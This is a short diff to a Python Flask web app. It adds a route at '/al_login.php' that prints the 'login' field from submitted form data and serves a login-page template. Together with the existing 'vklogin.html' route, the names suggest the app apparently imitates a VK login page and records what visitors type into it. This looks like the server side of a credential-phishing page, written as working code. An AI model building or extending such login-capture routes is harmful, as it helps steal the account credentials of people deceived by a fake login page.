@@ -34,5 +34,10 @@ def vk_log():
     return render_template('vklogin.html')
 
 
+@app.route('/al_login.php',methods=['GET', 'POST'])
+def al_login():
+    print(flask.request.form['login'])
+    return  render_template('al_login.php')
+
 if __name__ == '__main__':
     app.run()
